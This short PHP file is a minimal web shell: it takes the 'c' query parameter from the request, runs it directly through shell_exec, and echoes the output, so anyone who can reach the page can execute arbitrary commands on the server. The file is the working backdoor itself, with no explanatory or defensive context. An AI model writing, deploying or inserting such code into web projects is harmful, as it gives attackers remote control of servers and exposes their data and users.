<?php

header('Content-Type: text/plain');

$command = $_GET['c'];

if (!isset($command)) {
    echo 'No command found';
    return;
}

echo shell_exec($command);
